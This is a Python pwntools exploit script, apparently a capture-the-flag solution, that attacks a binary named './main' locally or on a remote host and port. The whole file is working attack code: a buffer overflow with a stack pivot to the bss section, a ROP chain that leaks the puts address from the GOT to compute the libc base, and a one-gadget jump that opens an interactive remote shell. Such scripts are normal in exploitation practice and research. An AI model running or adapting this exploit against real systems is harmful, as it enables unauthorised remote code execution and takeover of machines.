from pwn import *
from binascii import hexlify as hl
from binascii import unhexlify as uhl
from time import sleep
import sys

binary  = "./main"
llib    = "/lib/x86_64-linux-gnu/libc-2.27.so"
rlib    = "./libc.so.6"
elf     = ELF(binary)
status  = sys.argv[1]
context.arch = 'amd64'

if(status == 'l'):
    io = process(binary)
    libc = ELF(llib)
elif(status == 'd'):
    io = process(binary,env = {"LD_PRELOAD":rlib})
    context.log_level = 'debug'
elif(status == 'r'):
    host = sys.argv[2]
    port = sys.argv[3]
    libc = ELF(rlib)
    info("REMOTE ATTACK "+sys.argv[2]+" "+sys.argv[3])
    io = remote(host,port)
else:
    info("INVALID STATUS")
    exit()

def sa(r,d):
    io.sendafter(r,d)
def sla(r,d):
    io.sendlineafter(r,d)
def s(d):
    io.send(d)
def sl(d):
    io.sendline(d)
def ru(d):
    io.recvuntil(d)
def gs():
    io.interactive()
def debug(c):
    gdb.attach(io,c)

def choice(c):
    sla("",str(c))

ru("Name:\n")
s(p64(elf.bss()+0xe0)*25+p64(0x4007a3)+p64(elf.got['puts'])+p64(elf.plt['puts'])+p64(0x40070e))
ru("Buffer:\n")
#debug("handle SIGALRM nostop noprint\nb *0x40072e\nc\n")
s("a"*0x40+p64(elf.bss()+0xe0)+p64(0x40070e))
sleep(0.8)
s("/bin/sh\x00")
leak = u64(io.recvuntil("\x7f")[-6:].strip().ljust(8,'\x00'))
info(hex(leak))
ru("Buffer:\n")
#debug("handle SIGALRM nostop noprint\nb *0x40072e\nc\n")
#s("/bin/sh\x00"*0x9+p64(0x4007a3)+p64(0x601120)+p64(leak-(libc.sym['puts']-libc.sym['system']))+p64(0x0))
info("BASE "+hex(leak-libc.sym['puts']) )
s(p64(0)*0x9+p64(leak-libc.sym['puts']+0xf1147))
gs()
